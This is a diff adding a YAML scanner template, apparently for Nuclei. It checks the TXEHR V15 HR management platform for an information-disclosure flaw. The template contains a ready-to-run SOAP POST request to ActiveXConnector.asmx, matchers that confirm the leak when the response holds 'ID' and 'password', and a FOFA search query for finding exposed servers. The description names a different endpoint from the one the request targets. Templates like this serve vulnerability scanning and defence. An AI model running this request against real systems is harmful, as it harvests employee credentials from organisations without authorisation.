@@ -1,0 +1,43 @@
+id: tosharesoft-ActiveXConnector-disclosure
+info:
+  name: 同享人力管理管理平台 ActiveXConnector.asmx - disclosure
+  author: leadlife
+  severity: high
+  description: 同享TXEHR V15人力管理平台的Assistant/Default.aspx接口存在敏感信息泄露漏洞。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E5%90%8C%E4%BA%AB%E4%BA%BA%E5%8A%9B%E7%AE%A1%E7%90%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%90%8C%E4%BA%AB%E4%BA%BA%E5%8A%9B%E7%AE%A1%E7%90%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0ActiveXConnector.asmx%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="/Assistant/Default.aspx"
+    hunter-query: demo
+  tags: tosharesoft,hr,disclosure
+
+http:
+  - raw:
+      - |
+        POST /Service/ActiveXConnector.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        Priority: u=0, i
+        Content-Type: text/xml;charset=UTF-8
+        Content-Length: 224
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+          <soapenv:Header/>
+          <soapenv:Body>
+              <tem:GetActivexConnector/>
+          </soapenv:Body>
+        </soapenv:Envelope>
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'ID','password','GetActivexConnectorResult')
+        condition: and
